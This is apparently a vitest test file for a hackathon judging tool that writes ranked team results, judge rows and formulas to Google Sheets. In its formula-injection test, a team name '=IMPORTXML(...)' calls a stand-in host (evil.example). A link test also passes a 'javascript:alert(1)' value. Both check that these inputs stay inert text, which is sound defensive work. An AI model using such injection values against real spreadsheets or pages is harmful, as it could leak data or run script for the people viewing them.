import { describe, expect, test } from "vitest";

import {
  COMPLETENESS_LABEL,
  linkCell,
  summaryFormula,
  TOP_N,
  type TabState,
  buildResultsRequests,
  buildResultsRows,
  readCompletenessScores,
  adventureScore,
  rankByAdventure,
  topAdventureTeams,
  topTeams,
} from "~/server/api/utils/results-sheet";
import {
  type MarkRow,
  type TeamInfo,
  buildTeamResults,
} from "~/server/api/utils/team-results";

const team = (id: string, name: string, table: number | null): TeamInfo => ({
  id,
  name,
  table,
  github: null,
  devpost: `https://devpost.com/${id}`,
});

const mark = (
  teamId: string,
  judgeName: string,
  score: number,
  roundType: "regular" | "sponsored" = "regular",
  notes = "",
  superLike = false,
): MarkRow => ({
  teamId,
  judgeId: judgeName,
  judgeName,
  judgeType: roundType === "regular" ? "organizer" : "sponsored",
  roundType,
  score,
  ratings: { impact: score, creativity: score - 1, technical: score },
  notes,
  superLike,
});

const results = buildTeamResults(
  [team("a", "Alpha", 1), team("b", "Bravo", 2), team("c", "Charlie", null)],
  [
    mark("a", "Jo", 6),
    mark("a", "Sam", 7, "regular", "", true),
    mark("b", "Jo", 9),
    mark("b", "Spon", 8, "sponsored", "great demo", true),
  ],
);

describe("buildResultsRows", () => {
  const { rows, groups } = buildResultsRows(results);
  const header = rows[0]!.cells;
  const col = (name: string) => header.indexOf(name);
  const teamRows = rows.filter((r, i) => i > 0 && r.bold);

  test("header names the rubric criteria", () => {
    expect(header).toEqual(
      expect.arrayContaining(["Rank", "Average", "Innovation + Impact"]),
    );
    expect(rows[0]!.bold).toBe(true);
  });

  test("ranks team rows by regular average; unmarked teams last", () => {
    expect(teamRows.map((r) => r.cells[3])).toEqual([
      "Bravo",
      "Alpha",
      "Charlie",
    ]);
    expect(teamRows.map((r) => r.cells[0])).toEqual([1, 2, ""]);
  });

  test("each team row is followed by its regular judges' rows; sponsor marks are left out", () => {
    expect(rows.map((r) => r.cells[3])).toEqual([
      "Team / Judge",
      "Bravo",
      "↳ Jo",
      "Alpha",
      "↳ Jo",
      "↳ Sam",
      "Charlie",
    ]);
  });

  test("team averages are rounded; judge scores go under Average; no sponsor columns", () => {
    const alpha = teamRows.find((r) => r.cells[3] === "Alpha")!.cells;
    expect(alpha[col("Average")]).toBe(6.5);
    expect(alpha[col("Innovation + Impact")]).toBe(6.5);
    expect(header).not.toContain("Sponsor judges");
    expect(header).not.toContain("Sponsor average");
    const sam = rows.find((r) => r.cells[3] === "↳ Sam")!.cells;
    expect(sam[col("Average")]).toBe(7);
  });

  test("super likes: count on team rows, heart on judge rows", () => {
    const cellOf = (label: string) =>
      rows.find((r) => r.cells[3] === label)!.cells[col("Super likes")];
    expect(cellOf("Alpha")).toBe(1);
    expect(cellOf("Bravo")).toBe(0); // a sponsor judge's heart doesn't count
    expect(cellOf("Charlie")).toBe(0);
    expect(cellOf("↳ Sam")).toBe("♥");
    expect(cellOf("↳ Jo")).toBe("");
  });

  test("groups cover exactly the judge rows; unmarked teams get none", () => {
    expect(groups).toEqual([
      { teamId: "b", start: 2, end: 3 },
      { teamId: "a", start: 4, end: 6 },
    ]);
  });
});

describe("judge rows", () => {
  test("carry the notes and heart under their own columns", () => {
    const withNotes = buildTeamResults(
      [team("a", "Alpha", 1)],
      [mark("a", "Jo", 6, "regular", "great demo", true)],
    );
    const { rows } = buildResultsRows(withNotes);
    const header = rows[0]!.cells;
    const jo = rows.find((r) => r.cells[3] === "↳ Jo")!.cells;
    expect(jo[header.indexOf("Judges")]).toBe("judge");
    expect(jo[header.indexOf("Notes")]).toBe("great demo");
    expect(jo[header.indexOf("Super likes")]).toBe("♥");
    expect(jo[header.indexOf("Team ID")]).toBe("a");
  });
});

const tab = (sheetId: number, extra: Partial<TabState> = {}): TabState => ({
  sheetId,
  rowCount: 1000,
  columnCount: 26,
  rowGroups: [],
  conditionalFormatCount: 0,
  ...extra,
});

describe("Results and Marks", () => {
  test("judge groups are rebuilt and all start collapsed", () => {
    const old = [
      { range: { sheetId: 1, dimension: "ROWS", startIndex: 2, endIndex: 9 } },
    ];
    const requests = buildResultsRequests({
      tab: tab(1, { rowGroups: old }),
      results,
      scores: new Map(),
    });
    expect(requests.filter((r) => r.deleteDimensionGroup)).toHaveLength(1);
    expect(requests.filter((r) => r.addDimensionGroup)).toHaveLength(2);
    expect(
      requests
        .filter((r) => r.updateDimensionGroup)
        .every((r) => r.updateDimensionGroup!.dimensionGroup!.collapsed),
    ).toBe(true);
    // Old groups go before anything is written.
    expect(requests.findIndex((r) => r.deleteDimensionGroup)).toBeLessThan(
      requests.findIndex((r) => r.updateCells),
    );
  });

  test("grows the grid when there are more rows than the tab has", () => {
    const requests = buildResultsRequests({
      tab: tab(1, { rowCount: 3 }),
      results,
      scores: new Map(),
    });
    const append = requests.find((r) => r.appendDimension)!.appendDimension!;
    expect(append.sheetId).toBe(1);
  });
});

describe("Completeness and Final columns", () => {
  const header = buildResultsRows(results).rows[0]!.cells as string[];
  const at = (label: string) => header.indexOf(label);

  test("every rubric criterion has a column, incl. Technical Complexity", () => {
    expect(header).toEqual(
      expect.arrayContaining([
        "Innovation + Impact",
        "Creativity",
        "Technical Complexity",
        "Design/Polish",
        "Adventurous",
      ]),
    );
    const { rows } = buildResultsRows(results);
    const alpha = rows.find((r) => r.cells[3] === "Alpha")!.cells;
    expect(alpha[at("Technical Complexity")]).toBe(6.5);
  });

  test("Final sits right after Rank; links and Completeness right after the team name; no adventure columns", () => {
    expect(header.slice(0, 3)).toEqual(["Rank", "Final", "Table"]);
    expect(header).not.toContain("Adventure final");
    expect(header).not.toContain("Adventure");
    expect(header.slice(3, 14)).toEqual([
      "Team / Judge",
      "Devpost",
      "GitHub",
      COMPLETENESS_LABEL,
      "Judges",
      "Normalized",
      "Adventurous score",
      "Other 4",
      "Raw total",
      "Average",
      "Super likes",
    ]);
  });

  test("links show a short name, not the whole URL", () => {
    const { rows } = buildResultsRows(results);
    const alpha = rows.find((r) => r.cells[3] === "Alpha")!.cells;
    expect(alpha[at("Devpost")]).toEqual({
      text: "Devpost",
      link: "https://devpost.com/a",
    });
    expect(alpha[at("GitHub")]).toBe("");
    expect(linkCell("github.com/x/y", "GitHub")).toEqual({
      text: "GitHub",
      link: "https://github.com/x/y",
    });
    expect(linkCell("javascript:alert(1)", "GitHub")).toBe(
      "javascript:alert(1)",
    );
  });

  test("team rows get the typed score and a Final formula for their row", () => {
    const { rows } = buildResultsRows(results, new Map([["a", 8]]));
    const alphaIndex = rows.findIndex((r) => r.cells[3] === "Alpha");
    const alpha = rows[alphaIndex]!.cells;
    expect(alpha[at(COMPLETENESS_LABEL)]).toBe(8);
    const sheetRow = alphaIndex + 1;
    expect(alpha[at("Final")]).toEqual({
      formula: `=LET(b, IF(ISNUMBER(I${sheetRow}), I${sheetRow}, M${sheetRow}), IF(b="", "", IF(ISNUMBER(G${sheetRow}), ROUND((b * 5 + G${sheetRow}) / 6, 2), b)))`,
    });
    const bravo = rows.find((r) => r.cells[3] === "Bravo")!.cells;
    expect(bravo[at(COMPLETENESS_LABEL)]).toBe("");
  });

  test("judge rows leave both blank", () => {
    const { rows } = buildResultsRows(results, new Map([["a", 8]]));
    for (const r of rows.filter((r) => String(r.cells[3]).startsWith("↳"))) {
      expect(r.cells[at(COMPLETENESS_LABEL)]).toBe("");
      expect(r.cells[at("Final")]).toBe("");
    }
  });

  test("validation and red/green status go on team rows only", () => {
    const requests = buildResultsRequests({
      tab: tab(1),
      results,
      scores: new Map(),
    });
    const validated = requests
      .filter((r) => r.setDataValidation)
      .map((r) => r.setDataValidation!.range!.startRowIndex);
    expect(validated).toEqual(buildResultsRows(results).teamRows);
    expect(
      requests.filter((r) => r.setDataValidation)[0]!.setDataValidation!.range,
    ).toMatchObject({ startColumnIndex: 6, endColumnIndex: 7 });
    const rules = requests
      .filter((r) => r.addConditionalFormatRule)
      .map((r) => r.addConditionalFormatRule!.rule!);
    expect(rules.map((r) => r.booleanRule!.condition!.type)).toEqual([
      "BLANK",
      "NOT_BLANK",
    ]);
    expect(rules[0]!.ranges!.map((g) => g.startRowIndex)).toEqual(validated);
  });

  test("the summary tabs rank by score, then super likes, capped at the top 20", () => {
    expect(summaryFormula()).toBe(
      "=IFERROR(ARRAY_CONSTRAIN(LET(t, SORT(FILTER({'Results'!D2:D, 'Results'!B2:B, ROW('Results'!D2:D), 'Results'!N2:N}, 'Results'!A2:A<>\"\", 'Results'!B2:B<>\"\"), 2, FALSE, 4, FALSE, 3, TRUE), {SEQUENCE(ROWS(t)), CHOOSECOLS(t, 1, 2, 4)}), 20, 4), \"\")",
    );
    expect(summaryFormula("Results Adventure")).toContain(
      "'Results Adventure'!B2:B<>\"\"",
    );
  });
});

describe("normalized scores", () => {
  const scored = (
    id: string,
    name: string,
    s: Partial<TeamInfo>,
  ): TeamInfo => ({ ...team(id, name, null), ...s });
  // Bravo has the best raw average, but normalization puts Alpha first; both
  // clip to a normalized 10, so q decides.
  const normalized = buildTeamResults(
    [
      scored("a", "Alpha", {
        normalized: 10,
        normalizedQ: 3.2,
        adventure: 9,
        adventurous: 9,
        otherFour: 9,
        rawTotal: 7.5,
      }),
      scored("b", "Bravo", {
        normalized: 10,
        normalizedQ: 2.1,
        adventure: 6,
        rawTotal: 8.9,
      }),
      scored("c", "Charlie", {
        normalized: 4.5,
        normalizedQ: -0.4,
        adventure: 5,
        rawTotal: 6,
      }),
      scored("d", "Delta", {}),
    ],
    [
      mark("a", "Jo", 6),
      mark("b", "Jo", 9),
      mark("c", "Jo", 8),
      mark("d", "Jo", 10),
    ],
  );
  const { rows } = buildResultsRows(normalized);
  const header = rows[0]!.cells as string[];
  const teamRows = rows.filter((r, i) => i > 0 && r.bold);

  test("rank by q, then normalized; teams not yet normalized come after", () => {
    expect(teamRows.map((r) => r.cells[3])).toEqual([
      "Alpha",
      "Bravo",
      "Charlie",
      "Delta",
    ]);
  });

  test("team rows show Normalized and Raw total; Adventure only on Results Adventure", () => {
    const alpha = teamRows[0]!.cells;
    expect(alpha[header.indexOf("Normalized")]).toBe(10);
    expect(alpha[header.indexOf("Raw total")]).toBe(7.5);
    const adv = buildResultsRows(normalized, new Map(), { kind: "adventure" });
    const advHeader = adv.rows[0]!.cells as string[];
    const advAlpha = adv.rows.find((r) => r.cells[3] === "Alpha")!.cells;
    expect(advAlpha[advHeader.indexOf("Adventure")]).toBe(9);
    const delta = teamRows[3]!.cells;
    expect(delta[header.indexOf("Normalized")]).toBe("");
  });

  test("without any normalization, the judge average ranks", () => {
    expect(
      buildResultsRows(results)
        .rows.filter((r, i) => i > 0 && r.bold)
        .map((r) => r.cells[3]),
    ).toEqual(["Bravo", "Alpha", "Charlie"]);
  });
});

describe("adventure", () => {
  const adv = (
    id: string,
    s: Partial<TeamInfo>,
    score: number,
  ): [TeamInfo, MarkRow] => [
    { ...team(id, id.toUpperCase(), null), ...s },
    mark(id, "Jo", score),
  ];
  // Overall order is by judge score: a, b, c, d. Adventure (0.65 × A +
  // 0.35 × O): a 4.35, b 5, c 7, d 9.5 — so d, c, b, a.
  const pairs = [
    adv("a", { adventurous: 3, otherFour: 6.86 }, 9),
    adv("b", { adventurous: 5, otherFour: 5 }, 8),
    adv("c", { adventurous: 8, otherFour: 5.14 }, 7),
    adv("d", { adventurous: 10, otherFour: 8.57 }, 6),
    adv("e", { otherFour: 9 }, 5),
  ];
  const all = buildTeamResults(
    pairs.map(([t]) => t),
    pairs.map(([, m]) => m),
  );

  test("ranks by 65% adventurous + 35% other four; no adventurous, no rank", () => {
    expect(adventureScore(all[0]!)).toBeCloseTo(4.35, 2);
    expect(rankByAdventure(all).map((r) => r.team.id)).toEqual([
      "d",
      "c",
      "b",
      "a",
    ]);
  });

  test("Results takes the top overall, Results Adventure the top by adventure", () => {
    expect(topTeams(all, 2).map((r) => r.team.id)).toEqual(["a", "b"]);
    expect(topAdventureTeams(all, 2).map((r) => r.team.id)).toEqual(["d", "c"]);
  });

  describe("Results Adventure", () => {
    const include = new Set(topAdventureTeams(all, 3).map((r) => r.team.id));
    const mirrored = new Set(["b"]); // b is also on Results
    const built = buildResultsRows(all, new Map([["c", 6]]), {
      kind: "adventure",
      include,
      mirrored,
    });
    const header = built.rows[0]!.cells as string[];
    const teamRows = built.rows.filter((r, i) => i > 0 && r.bold);

    test("same layout, Adventure final and Adventure in place of Final and Normalized", () => {
      const overall = buildResultsRows(all).rows[0]!.cells as string[];
      expect(header).toHaveLength(overall.length);
      expect(header[1]).toBe("Adventure final");
      expect(header[overall.indexOf("Normalized")]).toBe("Adventure");
      expect(header).not.toContain("Final");
      expect(header.filter((h, i) => h !== overall[i])).toEqual([
        "Adventure final",
        "Adventure",
      ]);
    });

    test("ranked by adventure, rank counting from 1", () => {
      expect(teamRows.map((r) => [r.cells[0], r.cells[3]])).toEqual([
        [1, "D"],
        [2, "C"],
        [3, "B"],
      ]);
    });

    test("Adventure final formula over this tab's own columns", () => {
      const i = built.rows.findIndex((r) => r.cells[3] === "C");
      const row = i + 1;
      expect(built.rows[i]!.cells[1]).toEqual({
        formula: `=IF(OR(J${row}="", K${row}=""), "", IF(ISNUMBER(G${row}), ROUND(0.65 * J${row} + 0.35 * (K${row} * 4 + G${row}) / 5, 2), ROUND(0.65 * J${row} + 0.35 * K${row}, 2)))`,
      });
    });

    test("Completeness is typed here, or looked up from Results for teams on both", () => {
      const comp = header.indexOf(COMPLETENESS_LABEL);
      const c = built.rows.find((r) => r.cells[3] === "C")!.cells;
      expect(c[comp]).toBe(6);
      const bIndex = built.rows.findIndex((r) => r.cells[3] === "B");
      const b = built.rows[bIndex]!.cells;
      const row = bIndex + 1;
      expect(b[comp]).toEqual({
        formula: `=LET(v, XLOOKUP(U${row}, Results!U2:U, Results!G2:G, ""), IF(v="", "", v))`,
      });
      // Only typed cells get validated.
      expect(built.typedRows).toEqual(
        built.teamRows.filter((r) => r !== bIndex),
      );
    });
  });

  test("Adventurous and Other 4 are on team rows", () => {
    const { rows } = buildResultsRows(all);
    const header = rows[0]!.cells as string[];
    const a = rows.find((r) => r.cells[3] === "A")!.cells;
    expect(a[header.indexOf("Adventurous score")]).toBe(3);
    expect(a[header.indexOf("Other 4")]).toBe(6.86);
  });
});

describe("keeping typed scores on a re-export", () => {
  const sheetNow = (): unknown[][] => {
    const { rows } = buildResultsRows(results);
    const header = rows[0]!.cells as string[];
    const out: unknown[][] = rows.map((r) =>
      r.cells.map((c) => (typeof c === "object" ? 0 : c)),
    );
    // Someone typed 7 for Alpha, and (wrongly) 5 on a judge row.
    const comp = header.indexOf(COMPLETENESS_LABEL);
    out.find((r) => r[3] === "Alpha")![comp] = 7;
    out.find((r) => String(r[3]).startsWith("↳"))![comp] = 5;
    return out;
  };

  test("reads team-row scores by team ID, ignoring judge rows", () => {
    expect([...readCompletenessScores(sheetNow())]).toEqual([["a", 7]]);
  });

  test("an old Results layout without the column yields nothing", () => {
    expect(
      readCompletenessScores([
        ["Rank", "Team / Judge", "Team ID"],
        [1, "Alpha", "a"],
      ]).size,
    ).toBe(0);
  });

  test("scores typed on Results Adventure carry over; Results wins", () => {
    const adventureTab = [
      [
        "Rank",
        "Adventure final",
        "Table",
        "Team / Judge",
        "Team ID",
        COMPLETENESS_LABEL,
      ],
      [1, 0, 4, "Delta", "d", 6],
      [2, 0, 1, "Alpha", "a", 2],
    ];
    const scores = readCompletenessScores(sheetNow(), [], adventureTab);
    expect(scores.get("d")).toBe(6);
    expect(scores.get("a")).toBe(7);
  });

  test("scores from the old Completeness tab carry over; Results wins", () => {
    const scores = readCompletenessScores(sheetNow(), [
      [3, "a"],
      [9, "b"],
      ["", "c"],
    ]);
    expect(scores.get("a")).toBe(7);
    expect(scores.get("b")).toBe(9);
    expect(scores.has("c")).toBe(false);
  });
});

describe("text is never written as a formula", () => {
  test("a team name starting with = stays a string", () => {
    const evil = buildTeamResults(
      [team("x", '=IMPORTXML("https://evil.example","//a")', 1)],
      [mark("x", "=1+1", 5)],
    );
    const requests = buildResultsRequests({
      tab: tab(1),
      results: evil,
      scores: new Map(),
    });
    const values = requests
      .flatMap((r) => r.updateCells?.rows ?? [])
      .flatMap((row) => row.values ?? []);
    const formulas = values
      .map((v) => v.userEnteredValue?.formulaValue)
      .filter(Boolean);
    // Only our own Final formula(s), never the team or judge name.
    expect(
      formulas.every(
        (f) => f!.startsWith("=LET(b,") || f!.startsWith("=IF(OR("),
      ),
    ).toBe(true);
    expect(
      values.some((v) =>
        v.userEnteredValue?.stringValue?.startsWith("=IMPORTXML"),
      ),
    ).toBe(true);
  });
});

describe("top teams only", () => {
  // 25 teams, each scored once: team t1 gets 25, t2 gets 24, … t25 gets 1.
  const many = buildTeamResults(
    Array.from({ length: 25 }, (_, i) => team(`t${i + 1}`, `T${i + 1}`, i + 1)),
    Array.from({ length: 25 }, (_, i) => mark(`t${i + 1}`, "Jo", 25 - i)),
  );

  test(`keeps the best ${TOP_N} by judge average, best first`, () => {
    const top = topTeams(many);
    expect(top).toHaveLength(TOP_N);
    expect(top[0]!.team.id).toBe("t1");
    expect(top.at(-1)!.team.id).toBe(`t${TOP_N}`);
  });

  test("leaves out teams with no judge marks", () => {
    // Charlie has no marks at all; Bravo only has a judge mark of 9.
    expect(topTeams(results).map((r) => r.team.id)).toEqual(["b", "a"]);
  });

  test("Results only lists the teams passed in", () => {
    const top = topTeams(many, 3);
    const names = buildResultsRows(top)
      .rows.slice(1)
      .map((r) => r.cells[3]);
    expect(
      names.filter((n) => typeof n === "string" && !n.startsWith("↳")),
    ).toEqual(["T1", "T2", "T3"]);
  });
});
